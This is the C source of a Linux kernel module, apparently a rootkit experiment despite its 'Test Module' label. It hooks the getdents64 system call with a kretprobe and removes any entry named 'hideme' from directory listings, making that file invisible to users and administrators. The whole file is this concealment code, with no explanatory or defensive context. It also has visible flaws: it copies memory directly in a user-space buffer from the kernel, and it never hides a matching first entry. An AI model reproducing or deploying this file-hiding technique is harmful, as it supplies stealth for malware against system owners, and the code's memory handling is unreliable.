#define pr_fmt(fmt) KBUILD_MODNAME ": " fmt

#include <linux/module.h>
#include <linux/kernel.h>
#include <asm/unistd.h>
#include <linux/kthread.h>
#include <linux/kprobes.h>
#include <linux/fprobe.h>
#include <linux/dirent.h>
#include <linux/string.h>

static struct kretprobe kretp = {
        .maxactive = 20
};

struct getdent64_arguments {
    unsigned int fd;
    void* buffer_ptr;
    unsigned int count;
};

const char* hide_file_name = "hideme";

static int handler_pre(struct kretprobe_instance *ri, struct pt_regs *regs)
{
    struct getdent64_arguments* args;
    // syscall wrappers __x64_sys_* gets only ptr to regs
    regs = ((struct pt_regs*)regs->di);

    if (!current->mm)
        return 1;	/* Skip kernel threads */


    args = (struct getdent64_arguments*)ri->data;

    //unsigned long syscall = regs->orig_ax;
    args->fd = regs->di; // 0
    args->buffer_ptr = (void*)regs->si; // 1
    args->count = regs->dx; // 2

    return 0;
}

static int handle_post(struct kretprobe_instance *ri, struct pt_regs *regs)
{
    struct getdent64_arguments* args = (struct getdent64_arguments*) ri->data;
    unsigned long retval = regs_return_value(regs);

    unsigned long offset = 0;

    unsigned long hide_entry_offset = 0;
    unsigned long hide_entry_size = 0;

    // find entry to hide
    while(offset < retval){
        struct linux_dirent64* current_ent = (struct linux_dirent64* )(args->buffer_ptr + offset);
        if(strcmp(current_ent->d_name, hide_file_name) == 0){
            hide_entry_offset = offset;
            hide_entry_size = current_ent->d_reclen;
            break;
        }
        offset += current_ent->d_reclen;
    }

    if(hide_entry_offset) {
        // offset     2
        // nextOffset 3
        // [0, 1, 2, 3, 4]
        // -----[        ] dest
        // --------[     ] source
        memcpy(args->buffer_ptr + offset,  args->buffer_ptr + offset + hide_entry_size, (retval - offset - hide_entry_size));
        regs_set_return_value(regs, retval - hide_entry_size);
    }

    return 0;
}

static int __init entrypoint(void)
{
    kretp.entry_handler = handler_pre;
    kretp.handler = handle_post;
    kretp.kp.symbol_name = "__x64_sys_getdents64";
    kretp.data_size = sizeof(struct getdent64_arguments);

    if (register_kretprobe(&kretp) < 0) {
        pr_info("register_kretprobe failed\n");
        return -1;
    }
    pr_info("kretprobe registered\n");
    return 0;
}

static void __exit cleanup(void){
    pr_info("Missed probing %d instances of %s\n",
            kretp.nmissed, kretp.kp.symbol_name);

    unregister_kretprobe(&kretp);
    pr_info("Yarin Module cleanup\n");
}

module_init(entrypoint)
module_exit(cleanup)
MODULE_LICENSE("GPL");
MODULE_AUTHOR("Yarin");
MODULE_DESCRIPTION("Test Module");